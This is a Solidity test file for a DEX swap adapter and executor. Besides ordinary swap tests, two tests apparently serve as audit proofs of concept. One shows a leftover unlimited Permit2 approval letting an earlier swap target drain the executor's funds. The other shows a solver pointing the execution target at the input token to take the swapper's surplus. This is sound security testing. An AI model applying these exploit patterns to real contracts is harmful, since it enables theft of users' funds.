// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {BaseTest} from "test/base/BaseTest.sol";
import {DynamicP2DexAdapter} from "src/adapter/DynamicP2DexAdapter.sol";
import {IExchangeAdapter} from "src/interface/IExchangeAdapter.sol";
import {Execution, CosignedOrder} from "src/Structs.sol";
import {OrderLib} from "src/lib/OrderLib.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockDexRouter} from "test/mocks/MockDexRouter.sol";
import {MockPermit2} from "test/mocks/MockPermit2.sol";
import {Executor} from "src/Executor.sol";
import {OrderReactor} from "src/OrderReactor.sol";

contract Permit2Target is MockDexRouter {
    function pull(MockPermit2 permit2, address token, address from, uint160 amount) external {
        permit2.transferFrom(from, address(this), amount, token);
    }

    function swapThroughPreviousTarget(
        Permit2Target previousTarget,
        MockPermit2 permit2,
        address tokenIn,
        uint160 amount,
        uint160 stolenAmount,
        ERC20Mock tokenOut
    ) external {
        previousTarget.pull(permit2, tokenIn, msg.sender, stolenAmount);
        ERC20Mock(tokenIn).transferFrom(msg.sender, address(this), amount);
        tokenOut.mint(msg.sender, amount);
    }
}

contract DynamicP2DexAdapterTest is BaseTest {
    DynamicP2DexAdapter public adapterUut;
    MockDexRouter public routerA;
    MockDexRouter public routerB;
    MockPermit2 public permit2;

    function setUp() public override {
        super.setUp();
        routerA = new MockDexRouter();
        routerB = new MockDexRouter();
        permit2 = new MockPermit2();
        adapterUut = new DynamicP2DexAdapter(address(permit2));

        ERC20Mock(address(token)).mint(address(adapterUut), 2000 ether);
        adapter = address(adapterUut);
    }

    function test_swap_uses_dynamic_target_for_permit2_and_call() public {
        _swapThrough(address(routerA), 1000 ether);
        assertEq(ERC20Mock(address(token)).balanceOf(address(routerA)), 1000 ether);
        _assertPermit2Approval(address(routerA));

        _swapThrough(address(routerB), 500 ether);
        assertEq(ERC20Mock(address(token)).balanceOf(address(routerB)), 500 ether);
        _assertPermit2Approval(address(routerB));
    }

    function test_swap_reverts_invalid_target() public {
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = 500 ether;
        triggerUpper = 0;
        CosignedOrder memory cosignedOrder = order();

        bytes32 hash = OrderLib.hash(cosignedOrder.order);
        uint256 resolvedAmountOut = cosignedOrder.order.output.limit;
        vm.expectRevert(IExchangeAdapter.InvalidTarget.selector);
        Execution memory x = executionWithTargetData(0, address(0), hex"");
        adapterUut.delegateSwap(hash, resolvedAmountOut, cosignedOrder, x);
    }

    function test_previous_target_can_steal_executor_surplus_during_later_swap() public {
        Executor exec = new Executor(address(this), wm);
        Permit2Target previousTarget = new Permit2Target();
        Permit2Target currentTarget = new Permit2Target();
        executor = address(exec);
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = inAmount;

        token.mint(executor, inAmount);
        _swapThroughExecutor(
            exec,
            address(previousTarget),
            abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(token2), inAmount, executor))
        );
        token2.transferFrom(executor, signer, outAmount);

        (,, uint160 remaining, uint48 expiration) = permit2.allowance(executor, address(token), address(previousTarget));
        assertEq(remaining, type(uint160).max);
        assertEq(expiration, type(uint48).max);
        assertEq(token.allowance(executor, address(previousTarget)), 0);
        assertEq(token.allowance(executor, address(permit2)), 0);

        // The executor holds surplus plus the next order's input, but ERC20 cleanup blocks an idle pull.
        uint256 surplus = 500 ether;
        vm.warp(block.timestamp + 1 days);
        token.mint(executor, surplus + inAmount);
        vm.expectRevert(
            abi.encodeWithSignature(
                "ERC20InsufficientAllowance(address,uint256,uint256)", address(permit2), 0, inAmount
            )
        );
        previousTarget.pull(permit2, address(token), executor, uint160(inAmount));

        // A different target calls the old target while the later swap reopens the ERC20 allowance.
        _swapThroughExecutor(
            exec,
            address(currentTarget),
            abi.encodeCall(
                Permit2Target.swapThroughPreviousTarget,
                (previousTarget, permit2, address(token), uint160(inAmount), uint160(surplus), token2)
            )
        );

        assertEq(token.balanceOf(address(previousTarget)), inAmount + surplus);
        assertEq(token.balanceOf(address(currentTarget)), inAmount);
        assertEq(token.balanceOf(executor), 0);
        assertEq(token2.balanceOf(executor), outAmount);
        assertEq(token.allowance(executor, address(currentTarget)), 0);
        assertEq(token.allowance(executor, address(permit2)), 0);
    }

    function test_authorized_solver_can_capture_executor_surplus_via_arbitrary_target_when_permit2_zeroed() public {
        OrderReactor reactorUut = new OrderReactor(repermit, signer, wm);
        Executor exec = new Executor(address(reactorUut), wm);
        Permit2Target previousTarget = new Permit2Target();
        address solver = makeAddr("solver");
        allow(solver);

        reactor = address(reactorUut);
        executor = address(exec);
        adapter = address(adapterUut);
        recipient = other;
        inAmount = 1000 ether;
        inMax = inAmount;
        outAmount = 1000 ether;
        uint256 surplus = 500 ether;
        cosignInValue = 1;
        cosignOutValue = 1;
        slippage = 0;
        freshness = 300;

        // Seed and then explicitly zero Permit2 allowances before running the control and exploit paths.
        vm.startPrank(executor);
        permit2.approve(address(token), address(previousTarget), type(uint160).max, type(uint48).max);
        permit2.approve(address(token), address(routerA), type(uint160).max, type(uint48).max);
        permit2.approve(address(token), solver, type(uint160).max, type(uint48).max);
        permit2.approve(address(token), address(token), type(uint160).max, type(uint48).max);
        vm.stopPrank();
        _zeroPermit2Allowances(address(previousTarget), solver);
        _assertZeroPermit2Allowances(address(previousTarget), solver, true);

        // Control: without transferring surplus, Executor.execute distributes the seeded surplus to the swapper.
        token.mint(executor, surplus);
        token2.mint(solver, outAmount);
        vm.prank(solver);
        token2.transfer(executor, outAmount);

        CosignedOrder memory controlOrder = _signedOrder();
        vm.prank(solver);
        exec.execute(
            controlOrder,
            executionWithTargetData(outAmount, address(token), abi.encodeCall(IERC20.transfer, (solver, inAmount)))
        );

        assertEq(token.balanceOf(solver), inAmount);
        assertEq(token.balanceOf(swapper), surplus);
        assertEq(token2.balanceOf(recipient), outAmount);
        assertEq(token.balanceOf(executor), 0);
        assertEq(token2.balanceOf(executor), 0);

        // Explicitly zero all relevant Permit2 allowances again before the arbitrary-target surplus capture.
        _zeroPermit2Allowances(address(previousTarget), solver);
        _assertZeroPermit2Allowances(address(previousTarget), solver, true);
        _assertZeroErc20Allowances(address(previousTarget), solver);

        // Exploit: solver prefunds required output and sets x.target = input ERC20 with transfer(solver, inAmount + surplus).
        token.mint(executor, surplus);
        token2.mint(solver, outAmount);
        vm.prank(solver);
        token2.transfer(executor, outAmount);

        uint256 solverTokenBefore = token.balanceOf(solver);
        uint256 swapperTokenBefore = token.balanceOf(swapper);
        uint256 recipientOutBefore = token2.balanceOf(recipient);
        CosignedOrder memory co = _signedOrder();

        vm.prank(solver);
        exec.execute(
            co,
            executionWithTargetData(
                outAmount, address(token), abi.encodeCall(IERC20.transfer, (solver, inAmount + surplus))
            )
        );

        assertEq(token.balanceOf(solver) - solverTokenBefore, inAmount + surplus);
        assertEq(token.balanceOf(swapper) - swapperTokenBefore, 0);
        assertEq(token2.balanceOf(recipient) - recipientOutBefore, outAmount);
        assertEq(token.balanceOf(executor), 0);
        assertEq(token2.balanceOf(executor), 0);
        assertEq(token2.balanceOf(solver), 0);

        _assertZeroPermit2Allowances(address(previousTarget), solver, false);
        _assertZeroErc20Allowances(address(previousTarget), solver);
    }

    function _signedOrder() internal returns (CosignedOrder memory co) {
        co = order();
        fundOrderInput(co);
        co = cosign(co);
        co.signature = permitFor(co, reactor);
    }

    function _zeroPermit2Allowances(address previousTarget, address solver) internal {
        vm.startPrank(executor);
        permit2.approve(address(token), previousTarget, 0, 0);
        permit2.approve(address(token), address(routerA), 0, 0);
        permit2.approve(address(token), solver, 0, 0);
        permit2.approve(address(token), address(token), 0, 0);
        vm.stopPrank();
    }

    function _assertZeroPermit2Allowances(address previousTarget, address solver, bool includeInputTokenTarget)
        internal
        view
    {
        (,, uint160 prevRemaining, uint48 prevExpiration) = permit2.allowance(executor, address(token), previousTarget);
        assertEq(prevRemaining, 0);
        assertEq(prevExpiration, 0);

        (,, uint160 routerRemaining, uint48 routerExpiration) =
            permit2.allowance(executor, address(token), address(routerA));
        assertEq(routerRemaining, 0);
        assertEq(routerExpiration, 0);

        (,, uint160 solverRemaining, uint48 solverExpiration) = permit2.allowance(executor, address(token), solver);
        assertEq(solverRemaining, 0);
        assertEq(solverExpiration, 0);

        if (includeInputTokenTarget) {
            (,, uint160 tokenRemaining, uint48 tokenExpiration) =
                permit2.allowance(executor, address(token), address(token));
            assertEq(tokenRemaining, 0);
            assertEq(tokenExpiration, 0);
        }
    }

    function _assertZeroErc20Allowances(address previousTarget, address solver) internal view {
        assertEq(token.allowance(executor, address(token)), 0);
        assertEq(token.allowance(executor, address(permit2)), 0);
        assertEq(token.allowance(executor, previousTarget), 0);
        assertEq(token.allowance(executor, address(routerA)), 0);
        assertEq(token.allowance(executor, solver), 0);
        assertEq(token2.allowance(executor, reactor), 0);
    }

    function _swapThroughExecutor(Executor exec, address target, bytes memory data) internal {
        CosignedOrder memory co = order();
        exec.reactorCallback(
            OrderLib.hash(co.order), co.order.output.limit, co, executionWithTargetData(0, target, data)
        );
    }

    function _swapThrough(address target, uint256 amount) internal {
        inAmount = amount;
        inMax = amount;
        outAmount = amount / 2;
        triggerUpper = 0;
        CosignedOrder memory cosignedOrder = order();

        bytes memory data = abi.encodeWithSelector(
            MockDexRouter.doSwap.selector, address(token), amount, address(token2), amount, signer
        );

        bytes32 hash = OrderLib.hash(cosignedOrder.order);
        uint256 resolvedAmountOut = cosignedOrder.order.output.limit;
        Execution memory x = executionWithTargetData(0, target, data);
        adapterUut.delegateSwap(hash, resolvedAmountOut, cosignedOrder, x);

        assertEq(ERC20Mock(address(token)).allowance(address(adapterUut), target), 0);
        assertEq(ERC20Mock(address(token)).allowance(address(adapterUut), address(permit2)), 0);
    }

    function _assertPermit2Approval(address target) internal view {
        (address approvedToken, address approvedSpender, uint160 amount, uint48 expiration) = permit2.lastApproval();
        assertEq(approvedToken, address(token));
        assertEq(approvedSpender, target);
        assertEq(amount, type(uint160).max);
        assertEq(expiration, type(uint48).max);
    }
}
